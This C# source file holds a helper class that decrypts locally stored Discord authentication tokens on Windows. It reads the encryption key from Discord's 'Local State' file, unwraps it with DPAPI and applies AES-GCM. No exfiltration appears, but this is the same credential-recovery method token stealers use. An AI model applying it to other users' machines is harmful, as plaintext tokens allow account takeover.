using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;

namespace PSTManager.Dis;

public static class TokenDecryptor
{
    private const string EncryptedPrefix = "dQw4w9WgXcQ:";

    public static string? DecryptIfNeeded(string token)
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return token;

        if (!token.StartsWith(EncryptedPrefix))
            return token;

        var aesKey = GetAesKey();
        if (aesKey == null)
            return null;

        var encryptedB64 = token[EncryptedPrefix.Length..];
        var padded = encryptedB64.PadRight(encryptedB64.Length + (4 - encryptedB64.Length % 4) % 4, '=');
        var encryptedData = Convert.FromBase64String(padded);

        if (encryptedData.Length < 3 || encryptedData[0] != 'v' || encryptedData[1] != '1' || encryptedData[2] != '0')
            return null;

        var nonce = encryptedData[3..15];
        var ciphertext = encryptedData[15..];

        try
        {
            var plaintext = new byte[ciphertext.Length - 16];
            using var aes = new AesGcm(aesKey, 16);
            aes.Decrypt(nonce, ciphertext[..^16], ciphertext[^16..], plaintext, null);
            return Encoding.UTF8.GetString(plaintext);
        }
        catch
        {
            return null;
        }
    }

    private static byte[]? GetAesKey()
    {
        var localStatePath = GetLocalStatePath();
        if (!File.Exists(localStatePath))
            return null;

        try
        {
            var json = File.ReadAllText(localStatePath);
            var doc = JsonDocument.Parse(json);
            var encryptedKeyB64 = doc.RootElement
                .GetProperty("os_crypt")
                .GetProperty("encrypted_key")
                .GetString();

            if (encryptedKeyB64 == null)
                return null;

            var encryptedKey = Convert.FromBase64String(encryptedKeyB64);
            if (encryptedKey.Length < 5 || encryptedKey[..5].SequenceEqual("DPAPI"u8.ToArray()) == false)
                return null;

            return DpapiDecrypt(encryptedKey[5..]);
        }
        catch
        {
            return null;
        }
    }

    private static byte[]? DpapiDecrypt(byte[] data)
    {
        var blobIn = new DATA_BLOB { cbData = data.Length, pbData = Marshal.AllocHGlobal(data.Length) };
        var blobOut = new DATA_BLOB();

        try
        {
            Marshal.Copy(data, 0, blobIn.pbData, data.Length);

            if (CryptUnprotectData(ref blobIn, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, ref blobOut))
            {
                var result = new byte[blobOut.cbData];
                Marshal.Copy(blobOut.pbData, result, 0, blobOut.cbData);
                LocalFree(blobOut.pbData);
                return result;
            }

            return null;
        }
        finally
        {
            Marshal.FreeHGlobal(blobIn.pbData);
        }
    }

    private static string GetLocalStatePath()
    {
        var baseDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        return Path.Combine(baseDir, "discord", "Local State");
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct DATA_BLOB
    {
        public int cbData;
        public IntPtr pbData;
    }

    [DllImport("crypt32.dll", SetLastError = true)]
    [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
    private static extern bool CryptUnprotectData(
        ref DATA_BLOB pDataIn,
        IntPtr pOptionalEntropy,
        IntPtr pvReserved,
        IntPtr pPromptStruct,
        IntPtr pPromptStruct2,
        int dwFlags,
        ref DATA_BLOB pDataOut);

    [DllImport("kernel32.dll")]
    [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
    private static extern IntPtr LocalFree(IntPtr hMem);
}
